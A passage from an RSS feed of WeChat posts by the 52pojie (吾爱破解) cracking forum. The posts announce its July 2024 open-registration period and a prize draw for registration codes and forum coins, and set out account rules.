initial;">开</span><span style="display: inline-block; text-indent: initial;">放</span><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">册</span><span style="display: inline-block; text-indent: initial;">都</span><span style="display: inline-block; text-indent: initial;">有</span><span style="display: inline-block; text-indent: initial;">很</span><span style="display: inline-block; text-indent: initial;">多</span><span style="display: inline-block; text-indent: initial;">人</span><span style="display: inline-block; text-indent: initial;">只</span><span style="display: inline-block; text-indent: initial;">是</span><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">册</span><span style="display: inline-block; text-indent: initial;">完</span><span style="display: inline-block; text-indent: initial;">账</span><span style="display: inline-block; text-indent: initial;">号</span><span style="display: inline-block; text-indent: initial;">就</span><span style="display: inline-block; text-indent: initial;">完</span><span style="display: inline-block; text-indent: initial;">事</span><span style="display: inline-block; text-indent: initial;">了</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">后</span><span style="display: inline-block; text-indent: initial;">续</span><span style="display: inline-block; text-indent: initial;">没</span><span style="display: inline-block; text-indent: initial;">能</span><span style="display: inline-block; text-indent: initial;">坚</span><span style="display: inline-block; text-indent: initial;">持</span><span style="display: inline-block; text-indent: initial;">登</span><span style="display: inline-block; text-indent: initial;">陆</span><span style="display: inline-block; text-indent: initial;">发</span><span style="display: inline-block; text-indent: initial;">帖</span><span style="display: inline-block; text-indent: initial;">或</span><span style="display: inline-block; text-indent: initial;">回</span><span style="display: inline-block; text-indent: initial;">帖</span><span style="display: inline-block; text-indent: initial;">导</span><span style="display: inline-block; text-indent: initial;">致</span><span style="display: inline-block; text-indent: initial;">账</span><span style="display: inline-block; text-indent: initial;">号</span><span style="display: inline-block; text-indent: initial;">被</span><span style="display: inline-block; text-indent: initial;">清</span><span style="display: inline-block; text-indent: initial;">理</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">最</span><span style="display: inline-block; text-indent: initial;">后</span><span style="display: inline-block; text-indent: initial;">希</span><span style="display: inline-block; text-indent: initial;">望</span><span style="display: inline-block; text-indent: initial;">大</span><span style="display: inline-block; text-indent: initial;">家</span><span style="display: inline-block; text-indent: initial;">都</span><span style="display: inline-block; text-indent: initial;">能</span><span style="display: inline-block; text-indent: initial;">成</span><span style="display: inline-block; text-indent: initial;">功</span><span style="display: inline-block; text-indent: initial;">加</span><span style="display: inline-block; text-indent: initial;">入</span><span style="display: inline-block; text-indent: initial;">论</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">。</span></span></p></li><li><p><span style="font-size: 14px;"><span style="display: inline-block; text-indent: initial;">论</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">禁</span><span style="display: inline-block; text-indent: initial;">止</span><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">册</span><span style="display: inline-block; text-indent: initial;">多</span><span style="display: inline-block; text-indent: initial;">个</span><span style="display: inline-block; text-indent: initial;">马</span><span style="display: inline-block; text-indent: initial;">甲</span><span style="display: inline-block; text-indent: initial;">账</span><span style="display: inline-block; text-indent: initial;">号</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">禁</span><span style="display: inline-block; text-indent: initial;">止</span><span style="display: inline-block; text-indent: initial;">贩</span><span style="display: inline-block; text-indent: initial;">卖</span><span style="display: inline-block; text-indent: initial;">倒</span><span style="display: inline-block; text-indent: initial;">卖</span><span style="display: inline-block; text-indent: initial;">论</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">账</span><span style="display: inline-block; text-indent: initial;">号</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">一</span><span style="display: inline-block; text-indent: initial;">经</span><span style="display: inline-block; text-indent: initial;">发</span><span style="display: inline-block; text-indent: initial;">现</span><span style="display: inline-block; text-indent: initial;">即</span><span style="display: inline-block; text-indent: initial;">会</span><span style="display: inline-block; text-indent: initial;">删</span><span style="display: inline-block; text-indent: initial;">除</span><span style="display: inline-block; text-indent: initial;">账</span><span style="display: inline-block; text-indent: initial;">号</span><span style="display: inline-block; text-indent: initial;">处</span><span style="display: inline-block; text-indent: initial;">理</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">请</span><span style="display: inline-block; text-indent: initial;">珍</span><span style="display: inline-block; text-indent: initial;">惜</span><span style="display: inline-block; text-indent: initial;">自</span><span style="display: inline-block; text-indent: initial;">己</span><span style="display: inline-block; text-indent: initial;">宝</span><span style="display: inline-block; text-indent: initial;">贵</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">论</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">账</span><span style="display: inline-block; text-indent: initial;">号</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">小</span><span style="display: inline-block; text-indent: initial;">小</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">账</span><span style="display: inline-block; text-indent: initial;">号</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">给</span><span style="display: inline-block; text-indent: initial;">你</span><span style="display: inline-block; text-indent: initial;">带</span><span style="display: inline-block; text-indent: initial;">来</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">欢</span><span style="display: inline-block; text-indent: initial;">声</span><span style="display: inline-block; text-indent: initial;">笑</span><span style="display: inline-block; text-indent: initial;">语</span><span style="display: inline-block; text-indent: initial;">是</span><span style="display: inline-block; text-indent: initial;">无</span><span style="display: inline-block; text-indent: initial;">法</span><span style="display: inline-block; text-indent: initial;">用</span><span style="display: inline-block; text-indent: initial;">金</span><span style="display: inline-block; text-indent: initial;">钱</span><span style="display: inline-block; text-indent: initial;">衡</span><span style="display: inline-block; text-indent: initial;">量</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">祝</span><span style="display: inline-block; text-indent: initial;">你</span><span style="display: inline-block; text-indent: initial;">访</span><span style="display: inline-block; text-indent: initial;">问</span><span style="display: inline-block; text-indent: initial;">吾</span><span style="display: inline-block; text-indent: initial;">爱</span><span style="display: inline-block; text-indent: initial;">破</span><span style="display: inline-block; text-indent: initial;">解</span><span style="display: inline-block; text-indent: initial;">论</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">心</span><span style="display: inline-block; text-indent: initial;">情</span><span style="display: inline-block; text-indent: initial;">愉</span><span style="display: inline-block; text-indent: initial;">快</span><span style="display: inline-block; text-indent: initial;">。</span></span></p></li></ul><p><br /></p><p><span style="color: rgb(0, 82, 255); font-size: 18px;"><strong><span style="display: inline-block; text-indent: initial;"></span><strong><strong style="letter-spacing: 0.544px;"><span style="display: inline-block; text-indent: initial;">微</span><span style="display: inline-block; text-indent: initial;">信</span><span style="display: inline-block; text-indent: initial;">抽</span><span style="display: inline-block; text-indent: initial;">奖</span><span style="display: inline-block; text-indent: initial;">活</span><span style="display: inline-block; text-indent: initial;">动</span><span style="display: inline-block; text-indent: initial;">（再</span><span style="display: inline-block; text-indent: initial;">抽4</span><span style="display: inline-block; text-indent: initial;">0</span><span style="display: inline-block; text-indent: initial;">名</span><span style="display: inline-block; text-indent: initial;">）</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">请</span><span style="display: inline-block; text-indent: initial;">在</span><span style="display: inline-block; text-indent: initial;">公</span><span style="display: inline-block; text-indent: initial;">众</span><span style="display: inline-block; text-indent: initial;">号</span><span style="display: inline-block; text-indent: initial;">后</span><span style="display: inline-block; text-indent: initial;">台</span><span style="display: inline-block; text-indent: initial;">回</span><span style="display: inline-block; text-indent: initial;">复</span><span style="display: inline-block; text-indent: initial;">“新</span><span style="display: inline-block; text-indent: initial;">福</span><span style="display: inline-block; text-indent: initial;">利</span><span style="display: inline-block; text-indent: initial;">”</span><span style="display: inline-block; text-indent: initial;">获</span><span style="display: inline-block; text-indent: initial;">取</span><span style="display: inline-block; text-indent: initial;">活</span><span style="display: inline-block; text-indent: initial;">动</span><span style="display: inline-block; text-indent: initial;">方</span><span style="display: inline-block; text-indent: initial;">法，<strong style="letter-spacing: 0.544px;"><span style="letter-spacing: 0.544px; text-decoration: underline;"><strong><span><em>上次参加完活动的同学这次参加还需要重新分享上传。</em></span></strong></span></strong></span></strong></strong></strong></span></p><p><span style="color: rgb(0, 82, 255); font-size: 18px;"><strong><strong style="letter-spacing: 0.544px;"><span style="display: inline-block; text-indent: initial;">周六7</span></strong><span style="display: inline-block; text-indent: initial;">月20</span><span style="display: inline-block; text-indent: initial;">日</span><span style="display: inline-block; text-indent: initial;">1</span><span style="display: inline-block; text-indent: initial;">4</span><span style="display: inline-block; text-indent: initial;">点</span><span style="display: inline-block; text-indent: initial;">开</span><span style="display: inline-block; text-indent: initial;">奖</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">再</span><span style="display: inline-block; text-indent: initial;">送</span><span style="display: inline-block; text-indent: initial;">4</span><span style="display: inline-block; text-indent: initial;">0</span><span style="display: inline-block; text-indent: initial;">个</span><span style="display: inline-block; text-indent: initial;">账</span><span style="display: inline-block; text-indent: initial;">号</span><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">册</span><span style="display: inline-block; text-indent: initial;">码</span><span style="display: inline-block; text-indent: initial;">或</span><span style="display: inline-block; text-indent: initial;">者</span><span style="display: inline-block; text-indent: initial;">3</span><span style="display: inline-block; text-indent: initial;">0</span><span style="display: inline-block; text-indent: initial;">0</span><span style="display: inline-block; text-indent: initial;">论</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">币。</span></strong></span></p><p><span style="color: rgb(0, 82, 255); font-size: 18px;"><strong><span style="display: inline-block; text-indent: initial;"><br /></span></strong></span></p><p><span style="color: rgb(0, 82, 255); font-size: 18px;"><strong><span style="display: inline-block; text-indent: initial;">如果开放注册需要提醒你，那里需要设置“星标”，否则可能无法收到推送。</span></strong></span></p><p><span style="color: rgb(0, 82, 255); font-size: 18px;"><strong><br /></strong></span></p><p><em><span style="color: rgb(136, 136, 136); font-size: 14px;"></span></em><em style="letter-spacing: 0.544px;"><span style="color: rgb(136, 136, 136); font-size: 14px;"><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">：</span><span style="display: inline-block; text-indent: initial;">上</span><span style="display: inline-block; text-indent: initial;">次</span><span style="display: inline-block; text-indent: initial;">活</span><span style="display: inline-block; text-indent: initial;">动</span><span style="display: inline-block; text-indent: initial;">居</span><span style="display: inline-block; text-indent: initial;">然</span><span style="display: inline-block; text-indent: initial;">有</span><span style="display: inline-block; text-indent: initial;">多</span><span style="display: inline-block; text-indent: initial;">位</span><span style="display: inline-block; text-indent: initial;">同</span><span style="display: inline-block; text-indent: initial;">学</span><span style="display: inline-block; text-indent: initial;">没</span><span style="display: inline-block; text-indent: initial;">领</span><span style="display: inline-block; text-indent: initial;">奖</span><span style="display: inline-block; text-indent: initial;">？</span><span style="display: inline-block; text-indent: initial;">？</span><span style="display: inline-block; text-indent: initial;">？</span><span style="display: inline-block; text-indent: initial;">还</span><span style="display: inline-block; text-indent: initial;">有</span><span style="display: inline-block; text-indent: initial;">1</span><span style="display: inline-block; text-indent: initial;">位</span><span style="display: inline-block; text-indent: initial;">同</span><span style="display: inline-block; text-indent: initial;">学</span><span style="display: inline-block; text-indent: initial;">没</span><span style="display: inline-block; text-indent: initial;">有</span><span style="display: inline-block; text-indent: initial;">按</span><span style="display: inline-block; text-indent: initial;">照</span><span style="display: inline-block; text-indent: initial;">要</span><span style="display: inline-block; text-indent: initial;">求</span><span style="display: inline-block; text-indent: initial;">提</span><span style="display: inline-block; text-indent: initial;">前</span><span style="display: inline-block; text-indent: initial;">回</span><span style="display: inline-block; text-indent: initial;">复</span><span style="display: inline-block; text-indent: initial;">截</span><span style="display: inline-block; text-indent: initial;">图</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">也</span><span style="display: inline-block; text-indent: initial;">没</span><span style="display: inline-block; text-indent: initial;">能</span><span style="display: inline-block; text-indent: initial;">领</span><span style="display: inline-block; text-indent: initial;">奖</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">所</span><span style="display: inline-block; text-indent: initial;">以</span><span style="display: inline-block; text-indent: initial;">大</span><span style="display: inline-block; text-indent: initial;">家</span><span style="display: inline-block; text-indent: initial;">要</span><span style="display: inline-block; text-indent: initial;">好</span><span style="display: inline-block; text-indent: initial;">好</span><span style="display: inline-block; text-indent: initial;">阅</span><span style="display: inline-block; text-indent: initial;">读</span><span style="display: inline-block; text-indent: initial;">规</span><span style="display: inline-block; text-indent: initial;">则</span><span style="display: inline-block; text-indent: initial;">哦</span><span style="display: inline-block; text-indent: initial;">。</span></span></em></p><p><br /></p><p style="margin-bottom: 0px; color: rgb(53, 53, 53); text-align: start; letter-spacing: 0.544px; background-color: rgb(255, 255, 255); line-height: 25.6px; font-family: Tahoma, Helvetica, SimSun, sans-serif;"><strong><span style="color: rgb(0, 176, 80);"><strong><span style="color: rgb(255, 255, 255); background-color: rgb(0, 176, 80);">-官方论坛</span></strong></span></strong><br /></p><p style="margin-top: 8px; margin-bottom: 0px; letter-spacing: 0.544px; text-align: start; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><span>www.52pojie.cn</span></p><p style="margin-top: 8px; margin-bottom: 0px; letter-spacing: 0.544px; text-align: start; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><span><br /></span></p><p></p><p style="margin-bottom: 0px; letter-spacing: 0.544px; text-indent: 0em; text-align: center; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><span style="background-color: rgb(255, 251, 0); letter-spacing: normal; font-size: 24px;"><strong><span style="color: rgb(0, 0, 0); font-family: Verdana, Arial, Tahoma; letter-spacing: 5px; text-align: start; background-color: rgb(255, 255, 255);">👆👆👆</span></strong></span><span style="background-color: rgb(255, 251, 0); font-size: 16px; letter-spacing: normal;"><strong><span style="text-align: start; font-family: Arial, sans-serif;"><span style="color: rgb(0, 0, 0); font-family: Verdana, Arial, Tahoma; font-size: 20px; letter-spacing: 5px; background-color: rgb(255, 255, 255);"></span><strong style="font-family: Tahoma, Helvetica, SimSun, sans-serif; letter-spacing: 0.544px;"></strong></span></strong></span></p><p><span style="letter-spacing: normal;"><span style="font-size: 16px;">公众号<span style="color: rgb(255, 0, 0);"><strong>设置“星标”，</strong></span>您</span><span style="font-size: 16px; color: rgb(255, 0, 0);"><strong>不会错过</strong></span><span style="font-size: 16px;">新的消息通知<span style="color: rgb(247, 49, 49); font-family: Arial, sans-serif; font-size: 13px; text-align: start;"></span></span></span></p><p><span style="letter-spacing: normal;"><span style="font-size: 16px;">如</span><strong style="font-size: 16px; letter-spacing: 0.544px;"><span style="color: rgb(255, 0, 0);">开放注册、精华文章和周边活动</span></strong><span style="font-size: 16px;">等公告</span></span></p><p><span style="letter-spacing: normal;"><span style="font-size: 16px;"><br /></span></span></p><p style="margin-bottom: 0px; letter-spacing: 0.544px; text-indent: 0em; text-align: center; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><img class="rich_pages wxw-img" /></p><p style="display: none;"></p>



<p><a href="https://www.52pojie.cn/thread-1943355-1-1.html">阅读原文</a></p>
]]></content:encoded>
<pubDate>Wed, 17 Jul 2024 18:23:34 +0800</pubDate>
</item>
<item>
<title>暑假开放注册微信抽奖活动，先送20个账号注册码或300论坛币，下午两点开奖，详见：【开放注册公告】吾爱破解论坛2024年7月21日暑假开放注册公告。</title>
<link>https://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651141003&amp;idx=1&amp;sn=8bb19bba085fbfb37a331e39858646ef&amp;chksm=bd50a3df8a272ac9e2988fe9b697c12dc09152bf77590a95ef9f4338d1309494062b427940cc&amp;scene=58&amp;subscene=0</link>
<guid>https://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651141003&amp;idx=1&amp;sn=8bb19bba085fbfb37a331e39858646ef&amp;chksm=bd50a3df8a272ac9e2988fe9b697c12dc09152bf77590a95ef9f4338d1309494062b427940cc&amp;scene=58&amp;subscene=0</guid>
<content:encoded><![CDATA[
<p>
<span></span> <span>2024-07-15 10:25</span> <span style="display: inline-block;">北京</span>
</p>

<p></p>


<p style="margin-bottom: 0px; letter-spacing: 0.578px; text-align: center; margin-left: 8px; margin-right: 8px;">
<img src="https://wechat2rss.xlab.app/feed/90c827b8290310a96ef80a13df9dbcc06ab69892.xml" />
</p>

<div class="profile_area_hide" id="js_top_profile"><div class="wx_follow_context wx_follow_primary wx_follow_smart wx_follow_top " id="follow_placeholder"><div class="wx_follow_media weui-flex weui-flex_align-center "><div class="wx_follow_hd "><img class="wx_follow_avatar " src="http://mmsns.qpic.cn/mmsns/LFPriaSjBUZKGJ6e3ahOG8KFMaic9NIoicZ52tP0YFAgsQjwWjialyl8GQ/300" /></div> <div class="wx_follow_bd weui-flex__item "><div class="wx_follow_info "><div class="wx_follow_nickname ">吾爱破解论坛</div></div></div></div></div></div> <div class="share_notice js_share_notice_dom  "><!----> </div> <!----> <!----> <div class="wx_album_area js_album_wrap "></div> <!----> <div class="rich_media_meta_list "><div class="rich_media_meta_area_primary "><!----> <!----> </div> <div class="rich_media_meta_area_extra "><span class="rich_media_meta rich_media_meta_text " id="publish_time"></span>  <span class="rich_media_meta rich_media_meta_text " id="js_ip_wording_wrp" style="display: none;"><span id="js_ip_wording"></span></span></div></div>
]]></content:encoded>
<pubDate>Mon, 15 Jul 2024 10:24:44 +0800</pubDate>
</item>
<item>
<title>暑假开放注册微信抽奖活动，先送20个账号注册码或300论坛币，周一下午两点开奖，详见：【开放注册公告】吾爱破解论坛2024年7月21日暑假开放注册公告。</title>
<link>https://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651141001&amp;idx=1&amp;sn=dae297f7963dc754fc09638b69d636ed&amp;chksm=bd50a3dd8a272acb2816ce84cd57350dca97652f44794799bf08880188decc95540a0127bc6d&amp;scene=58&amp;subscene=0</link>
<guid>https://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651141001&amp;idx=1&amp;sn=dae297f7963dc754fc09638b69d636ed&amp;chksm=bd50a3dd8a272acb2816ce84cd57350dca97652f44794799bf08880188decc95540a0127bc6d&amp;scene=58&amp;subscene=0</guid>
<content:encoded><![CDATA[
<p>
<span></span> <span>2024-07-13 10:20</span> <span style="display: inline-block;">北京</span>
</p>

<p></p>


<p style="margin-bottom: 0px; letter-spacing: 0.578px; text-align: center; margin-left: 8px; margin-right: 8px;">
<img src="https://wechat2rss.xlab.app/feed/90c827b8290310a96ef80a13df9dbcc06ab69892.xml" />
</p>

<div class="profile_area_hide" id="js_top_profile"><div class="wx_follow_context wx_follow_primary wx_follow_smart wx_follow_top " id="follow_placeholder"><div class="wx_follow_media weui-flex weui-flex_align-center "><div class="wx_follow_hd "><img class="wx_follow_avatar " src="http://mmsns.qpic.cn/mmsns/LFPriaSjBUZKGJ6e3ahOG8KFMaic9NIoicZ52tP0YFAgsQjwWjialyl8GQ/300" /></div> <div class="wx_follow_bd weui-flex__item "><div class="wx_follow_info "><div class="wx_follow_nickname ">吾爱破解论坛</div></div></div></div></div></div> <div class="share_notice js_share_notice_dom  "><!----> </div> <!----> <!----> <div class="wx_album_area js_album_wrap "></div> <!----> <div class="rich_media_meta_list "><div class="rich_media_meta_area_primary "><!----> <!----> </div> <div class="rich_media_meta_area_extra "><span class="rich_media_meta rich_media_meta_text " id="publish_time"></span>  <span class="rich_media_meta rich_media_meta_text " id="js_ip_wording_wrp" style="display: none;"><span id="js_ip_wording"></span></span></div></div>
]]></content:encoded>
<pubDate>Fri, 12 Jul 2024 15:35:58 +0800</pubDate>
</item>
<item>
<title>【开放注册公告】吾爱破解论坛2024年7月21日暑假开放注册公告</title>
<link>https://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651140999&amp;idx=1&amp;sn=4486a4e17a1eb7bea26fdb431d8d96d8&amp;chksm=bd50a3d38a272ac5354b4da5144306032b1304fd76698371ff66e136b1ef38d95aa930570fc6&amp;scene=58&amp;subscene=0</link>
<guid>https://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651140999&amp;idx=1&amp;sn=4486a4e17a1eb7bea26fdb431d8d96d8&amp;chksm=bd50a3d38a272ac5354b4da5144306032b1304fd76698371ff66e136b1ef38d95aa930570fc6&amp;scene=58&amp;subscene=0</guid>
<content:encoded><![CDATA[
<p>
原创 <span>吾爱pojie</span> <span>2024-07-12 15:26</span> <span style="display: inline-block;">北京</span>
</p>

<p>内有福利，送20个账号注册码或300论坛币，吾爱破解论坛开放注册时间：2024年7月21日  12：00 -- 14：00 和  20：00 -- 22：00，赶紧上好闹钟顺便告诉小伙伴吧。</p>


<p style="margin-bottom: 0px; letter-spacing: 0.578px; text-align: center; margin-left: 8px; margin-right: 8px;">
<img src="https://wechat2rss.xlab.app/img-proxy/?k=4d4b4087&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_jpg%2FLFPriaSjBUZKRP0qgyCAugN0VnYiblj3nJKlOLNIr2rdoJ8hH9icGltjmpicibCjJBfUJGwHvOmVh7InDutgLUxZKxQ%2F0%3Fwx_fmt%3Djpeg" />
</p>

<h2 style="margin-top: 20px; margin-bottom: 20px; font-weight: bold; font-size: 24px; color: rgb(53, 53, 53); letter-spacing: normal; text-align: start; border-bottom: 2px solid rgb(204, 204, 204);"><span style="display: inline-block; text-indent: initial;">W</span><span style="display: inline-block; text-indent: initial;">h</span><span style="display: inline-block; text-indent: initial;">o</span><span style="display: inline-block; text-indent: initial;"> </span><span style="display: inline-block; text-indent: initial;">A</span><span style="display: inline-block; text-indent: initial;">r</span><span style="display: inline-block; text-indent: initial;">e</span><span style="display: inline-block; text-indent: initial;"> </span><span style="display: inline-block; text-indent: initial;">W</span><span style="display: inline-block; text-indent: initial;">e</span></h2><p style="margin-top: 15px; margin-bottom: 15px; letter-spacing: normal; text-align: start; color: rgb(68, 68, 68);"><span style="font-size: 14px;"><span style="display: inline-block; text-indent: initial;">吾</span><span style="display: inline-block; text-indent: initial;">爱</span><span style="display: inline-block; text-indent: initial;">破</span><span style="display: inline-block; text-indent: initial;">解</span><span style="display: inline-block; text-indent: initial;">论</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">从</span><span style="color: rgb(0, 0, 255);"><span style="display: inline-block; text-indent: initial;">2</span><span style="display: inline-block; text-indent: initial;">0</span><span style="display: inline-block; text-indent: initial;">0</span><span style="display: inline-block; text-indent: initial;">8</span><span style="display: inline-block; text-indent: initial;">年</span><span style="display: inline-block; text-indent: initial;">3</span><span style="display: inline-block; text-indent: initial;">月</span><span style="display: inline-block; text-indent: initial;">1</span><span style="display: inline-block; text-indent: initial;">3</span><span style="display: inline-block; text-indent: initial;">日</span></span><span style="display: inline-block; text-indent: initial;">建</span><span style="display: inline-block; text-indent: initial;">立</span><span style="display: inline-block; text-indent: initial;">以</span><span style="display: inline-block; text-indent: initial;">来</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">陪</span><span style="display: inline-block; text-indent: initial;">伴</span><span style="display: inline-block; text-indent: initial;">众</span><span style="display: inline-block; text-indent: initial;">多</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">友</span><span style="display: inline-block; text-indent: initial;">走</span><span style="display: inline-block; text-indent: initial;">过</span><span style="display: inline-block; text-indent: initial;">了</span><strong><span style="color: rgb(0, 0, 255); background-color: rgb(255, 255, 0);"><span style="display: inline-block; text-indent: initial;">1</span><span style="display: inline-block; text-indent: initial;">6</span><span style="display: inline-block; text-indent: initial;">年</span></span></strong><span style="display: inline-block; text-indent: initial;">艰</span><span style="display: inline-block; text-indent: initial;">辛</span><span style="display: inline-block; text-indent: initial;">而</span><span style="display: inline-block; text-indent: initial;">辉</span><span style="display: inline-block; text-indent: initial;">煌</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">风</span><span style="display: inline-block; text-indent: initial;">雨</span><span style="display: inline-block; text-indent: initial;">历</span><span style="display: inline-block; text-indent: initial;">程</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">以</span><span style="display: inline-block; text-indent: initial;">带</span><span style="display: inline-block; text-indent: initial;">领</span><span style="display: inline-block; text-indent: initial;">新</span><span style="display: inline-block; text-indent: initial;">手</span><span style="display: inline-block; text-indent: initial;">走</span><span style="display: inline-block; text-indent: initial;">入</span><span style="color: rgb(0, 0, 255);"><span style="display: inline-block; text-indent: initial;">密</span><span style="display: inline-block; text-indent: initial;">界</span></span><span style="display: inline-block; text-indent: initial;">大</span><span style="display: inline-block; text-indent: initial;">门</span><span style="display: inline-block; text-indent: initial;">为</span><span style="display: inline-block; text-indent: initial;">基</span><span style="display: inline-block; text-indent: initial;">础</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">汇</span><span style="display: inline-block; text-indent: initial;">集</span><span style="display: inline-block; text-indent: initial;">了</span><span style="display: inline-block; text-indent: initial;">一</span><span style="display: inline-block; text-indent: initial;">大</span><span style="display: inline-block; text-indent: initial;">批</span><span style="display: inline-block; text-indent: initial;">爱</span><span style="display: inline-block; text-indent: initial;">好</span><span style="display: inline-block; text-indent: initial;">者</span><span style="display: inline-block; text-indent: initial;">在</span><span style="display: inline-block; text-indent: initial;">此</span><span style="display: inline-block; text-indent: initial;">栖</span><span style="display: inline-block; text-indent: initial;">息</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">今</span><span style="display: inline-block; text-indent: initial;">天</span><span style="display: inline-block; text-indent: initial;">我</span><span style="display: inline-block; text-indent: initial;">们</span><span style="display: inline-block; text-indent: initial;">依</span><span style="display: inline-block; text-indent: initial;">然</span><span style="display: inline-block; text-indent: initial;">不</span><span style="display: inline-block; text-indent: initial;">忘</span><span style="display: inline-block; text-indent: initial;">初</span><span style="display: inline-block; text-indent: initial;">心</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">希</span><span style="display: inline-block; text-indent: initial;">望</span><span style="display: inline-block; text-indent: initial;">起</span><span style="display: inline-block; text-indent: initial;">到</span><span style="color: rgb(0, 0, 255);"><span style="display: inline-block; text-indent: initial;">承</span><span style="display: inline-block; text-indent: initial;">上</span><span style="display: inline-block; text-indent: initial;">启</span><span style="display: inline-block; text-indent: initial;">下</span></span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">作</span><span style="display: inline-block; text-indent: initial;">用</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">带</span><span style="display: inline-block; text-indent: initial;">领</span><span style="display: inline-block; text-indent: initial;">爱</span><span style="display: inline-block; text-indent: initial;">好</span><span style="display: inline-block; text-indent: initial;">者</span><span style="display: inline-block; text-indent: initial;">们</span><span style="display: inline-block; text-indent: initial;">走</span><span style="display: inline-block; text-indent: initial;">入</span><span style="display: inline-block; text-indent: initial;">密</span><span style="display: inline-block; text-indent: initial;">界</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">圣</span><span style="display: inline-block; text-indent: initial;">殿</span><span style="display: inline-block; text-indent: initial;">。</span></span></p><h2 style="margin-top: 20px; margin-bottom: 20px; font-weight: bold; font-size: 24px; color: rgb(53, 53, 53); letter-spacing: normal; text-align: start; border-bottom: 2px solid rgb(204, 204, 204);"><span style="display: inline-block; text-indent: initial;">开</span><span style="display: inline-block; text-indent: initial;">放</span><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">册</span></h2><p style="margin-top: 15px; margin-bottom: 15px; letter-spacing: normal; text-align: start; color: rgb(68, 68, 68);"><span style="font-size: 14px;"><span><span style="display: inline-block; text-indent: initial;">我</span><span style="display: inline-block; text-indent: initial;">们</span><span style="display: inline-block; text-indent: initial;">在</span><span style="display: inline-block; text-indent: initial;">官</span><span style="display: inline-block; text-indent: initial;">方</span><span style="display: inline-block; text-indent: initial;">微</span><span style="display: inline-block; text-indent: initial;">信</span><span style="display: inline-block; text-indent: initial;">和</span><span style="display: inline-block; text-indent: initial;">微</span><span style="display: inline-block; text-indent: initial;">博</span><span style="display: inline-block; text-indent: initial;">收</span><span style="display: inline-block; text-indent: initial;">到</span><span style="display: inline-block; text-indent: initial;">很</span><span style="display: inline-block; text-indent: initial;">多</span><span style="display: inline-block; text-indent: initial;">朋</span><span style="display: inline-block; text-indent: initial;">友</span><span style="display: inline-block; text-indent: initial;">发</span><span style="display: inline-block; text-indent: initial;">来</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">消</span><span style="display: inline-block; text-indent: initial;">息</span><span style="display: inline-block; text-indent: initial;">，</span><span 